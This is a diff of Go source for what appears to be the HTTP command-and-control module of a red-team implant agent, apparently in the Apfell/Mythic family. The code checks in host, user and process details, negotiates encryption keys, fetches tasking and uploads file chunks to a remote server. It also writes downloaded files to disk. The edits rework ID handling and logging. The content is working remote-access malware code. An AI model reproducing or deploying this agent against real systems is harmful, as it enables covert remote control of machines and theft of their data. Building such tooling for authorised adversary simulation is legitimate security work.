@@ -134,7 +134,7 @@ func (c *C2Default) SetRsaKey(newKey *rsa.PrivateKey) {
 // CheckIn - check in a new agent
 func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interface{} {
 	var resp []byte
-
+	c.ApfellID = c.UUID
 	checkin := structs.CheckInMessage{}
 	checkin.Action = "checkin"
 	checkin.User = user
@@ -148,35 +148,25 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 		checkin.IntegrityLevel = 2
 	}
 
-	raw, _ := json.Marshal(checkin)
-	//log.Printf("Sending checkin msg: %+v\n", checkin)
-
 	if c.ExchangingKeys { // If exchangingKeys == true, then start EKE
 		_ = c.NegotiateKey()
-
-		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
-		resp = c.htmlPostData(endpoint, raw)
-
-	} else {
-
-		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // If we're not using encryption, we hit the callbacks endpoint directly
-		resp = c.htmlPostData(endpoint, raw)
-		//log.Printf("Raw HTMLPostData response: %s\n", string(resp))
 	}
+
+	//log.Printf("Sending checkin msg: %#v\n", checkin)
+	raw, _ := json.Marshal(checkin)
+	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
+	resp = c.htmlPostData(endpoint, raw)
 
 	// save the apfell id
 	response := structs.CheckInMessageResponse{}
 	err := json.Unmarshal(resp, &response)
-	//log.Printf("Raw response: %s", string(resp))
+	//log.Printf("Apfell Checkin Response: %#v", response)
 	if err != nil {
-		log.Println("message:\n", string(resp))
 		log.Printf("Error in unmarshal:\n %s", err.Error())
 	}
 
-	//log.Printf("Received ApfellID: %+v\n", c)
-
 	if len(response.ID) != 0 {
-		c.UUID = response.ID // Assign new UUID for the agent to use in every request
+		//log.Printf("Saving new UUID: %s\n", response.ID)
 		c.ApfellID = response.ID
 	}
 
@@ -195,7 +185,7 @@ func (c *C2Default) GetTasking() interface{} {
 	raw, err := json.Marshal(request)
 
 	if err != nil {
-		// log.Printf("")
+		log.Printf("Error unmarshalling: %s", err.Error())
 	}
 
 	rawTask := c.htmlGetData(url, raw)
@@ -205,7 +195,7 @@ func (c *C2Default) GetTasking() interface{} {
 	err = json.Unmarshal(rawTask, &task)
 
 	if err != nil {
-		//log.Printf("Error unmarshalling task data: %s", err.Error())
+		log.Printf("Error unmarshalling task data: %s", err.Error())
 	}
 
 	return task
@@ -213,6 +203,7 @@ func (c *C2Default) GetTasking() interface{} {
 
 //PostResponse - Post task responses
 func (c *C2Default) PostResponse(task structs.Task, output string) []byte {
+	//log.Printf("Responding to task: %#v\n", task)
 	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 	return c.postRESTResponse(endpoint, task, []byte(output))
 }
@@ -231,11 +222,12 @@ func (c *C2Default) postRESTResponse(urlEnding string, task structs.Task, data [
 
 		_, err := r.Read(dataBuffer)
 		if err != nil {
-			//fmt.Sprintf("Error reading %s: %s", err)
+			fmt.Sprintf("Error reading %s: %s", err)
 			break
 		}
 
 		responseMsg := structs.TaskResponseMessage{}
+		responseMsg.Action = "post_response"
 		resp := structs.Response{}
 		resp.Response = dataBuffer
 		resp.TaskID = task.TaskID
@@ -256,12 +248,15 @@ func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
 	//log.Println("Sending POST request to url: ", url)
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.AesPSK) != 0 {
+		//log.Printf("Encrypting Post data")
 		sendData = EncryptMessage(sendData, c.AesPSK)
 		//sendData = c.encryptMessage(sendData)
 	}
 
-	sendData = append([]byte(c.UUID), sendData...)                 // Prepend the UUID
+	sendData = append([]byte(c.ApfellID), sendData...) // Prepend the UUID
+	//log.Printf("Raw post data with UUID: %s\n", string(sendData))
 	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
+	//log.Printf("Base64 encoded post data: %s\n", string(sendData))
 	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
 	contentLength := len(sendData)
 	req.ContentLength = int64(contentLength)
@@ -276,7 +271,7 @@ func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
 	resp, err := client.Do(req)
 
 	if err != nil {
-		//log.Printf("Error completing POST request %s", err.Error())
+		log.Printf("Error completing POST request %s", err.Error())
 		return make([]byte, 0)
 	}
 
@@ -290,19 +285,22 @@ func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
 	body, err := ioutil.ReadAll(resp.Body)
 
 	if err != nil {
-		//log.Printf("Error reading response body: %s", err.Error())
+		log.Printf("Error reading response body: %s", err.Error())
 		return make([]byte, 0)
 	}
 
 	raw, err := base64.StdEncoding.DecodeString(string(body))
 	if err != nil {
+		log.Println("Error decoding data: ", err.Error())
 		return make([]byte, 0)
 	}
 
+	//log.Printf("Raw response length with UUID: %d", len(raw))
 	enc_raw := raw[36:] // Remove the Payload UUID
+	//log.Printf("Raw response length without UUID: %d", len(enc_raw))
 	// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
 	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
-		//log.Printf("C2Default config in if: %+v\n", c)
+		//log.Printf("Decrypting data")
 		return DecryptMessage(enc_raw, c.AesPSK)
 		//return c.decryptMessage(body)
 	}
@@ -316,16 +314,14 @@ func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 	client := &http.Client{}
 
 	if len(c.AesPSK) > 0 && len(body) > 0 {
-
 		body = EncryptMessage(body, c.AesPSK) // Encrypt and then encapsulate the task request
 	}
 
-	encapbody := append([]byte(c.UUID), body...)                              // Prepend the UUID to the body of the request
+	encapbody := append([]byte(c.ApfellID), body...)                          // Prepend the UUID to the body of the request
 	encbody := base64.StdEncoding.EncodeToString(encapbody)                   // Base64 the body
 	req, err := http.NewRequest("GET", url, bytes.NewBuffer([]byte(encbody))) // Make the new request
 	if err != nil {
-		//fmt.Sprintf("Error completing GET request: %s", err)
-		//log.Println("Error completing GET request: ", err.Error())
+		log.Println("Error completing GET request: ", err.Error())
 		return make([]byte, 0)
 	}
 
@@ -338,7 +334,7 @@ func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 	resp, err := client.Do(req)
 
 	if err != nil {
-		//log.Println("Error completing GET request: ", err.Error())
+		log.Println("Error completing GET request: ", err.Error())
 		return make([]byte, 0)
 	}
 
@@ -351,7 +347,11 @@ func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 
 	body, _ = ioutil.ReadAll(resp.Body)
 	raw, err := base64.StdEncoding.DecodeString(string(body)) // Remove the base64
-	enc_raw := raw[36:]                                       // Remove the prepended UUID
+	if err != nil {
+		log.Println("Error decoding data ", err.Error())
+		return make([]byte, 0)
+	}
+	enc_raw := raw[36:] // Remove the prepended UUID
 
 	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
 		//return c.decryptMessage(respBody)
@@ -372,11 +372,12 @@ func (c *C2Default) NegotiateKey() string {
 	initMessage.Action = "staging_rsa"
 	initMessage.SessionID = sessionID
 	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)
-
+	log.Printf("RSA Staging message: %#v", initMessage)
 	// Encode and encrypt the json message
 	raw, err := json.Marshal(initMessage)
 
 	if err != nil {
+		log.Printf("Error marshaling data: %s", err.Error())
 		return ""
 	}
 
@@ -388,7 +389,9 @@ func (c *C2Default) NegotiateKey() string {
 	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
 
 	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
+	//log.Printf("RSA staging response: %#v", sessionKeyResp)
 	if err != nil {
+		log.Printf("Error unmarshaling RsaResponse: %s", err.Error())
 		return ""
 	}
 
@@ -396,9 +399,10 @@ func (c *C2Default) NegotiateKey() string {
 	c.ExchangingKeys = false
 
 	if len(sessionKeyResp.UUID) > 0 {
-		c.UUID = sessionKeyResp.UUID // Save the new UUID
+		c.ApfellID = sessionKeyResp.UUID // Save the new UUID
 	}
 
+	//log.Printf("Config after key exchange: %#v", c)
 	return sessionID
 }
 
@@ -449,6 +453,7 @@ func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
 
 	f, err := os.Create(fileDetails.RemotePath)
 	if err != nil {
+		log.Printf("Error creating file: %s", err.Error())
 		return success
 	}
 	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
@@ -456,6 +461,7 @@ func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
 	_, err = f.Write(decoded)
 
 	if err != nil {
+		log.Printf("Error writing to file: %s", err.Error())
 		return success
 	}
 
@@ -479,6 +485,7 @@ func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
 			_, err := f.Write(decoded)
 
 			if err != nil {
+				log.Printf("Error writing to file: %s", err.Error())
 				success = false
 				break
 			}
@@ -508,6 +515,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 	err := json.Unmarshal(resp, &fileResp)
 
 	if err != nil {
+		log.Printf("Error unmarshaling: %s", err.Error())
 		return
 	}
 
@@ -524,6 +532,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 		// Create a temporary buffer and read a chunk into that buffer from the file
 		read, err := r.Read(partBuffer)
 		if err != nil || read == 0 {
+			log.Printf("Error reading from buffer: %s", err.Error())
 			break
 		}
 
@@ -547,7 +556,7 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 
 		_ = json.Unmarshal(resp, &postResp)
 
-		if !strings.Contains(postResp.Responses[1].Status, "success") {
+		if !strings.Contains(postResp.Responses[0].Status, "success") {
 			// If the post was not successful, wait and try to send it one more time
 			time.Sleep(time.Duration(c.Interval) * time.Second)
 			resp = c.htmlPostData(endpoint, dataToSend)
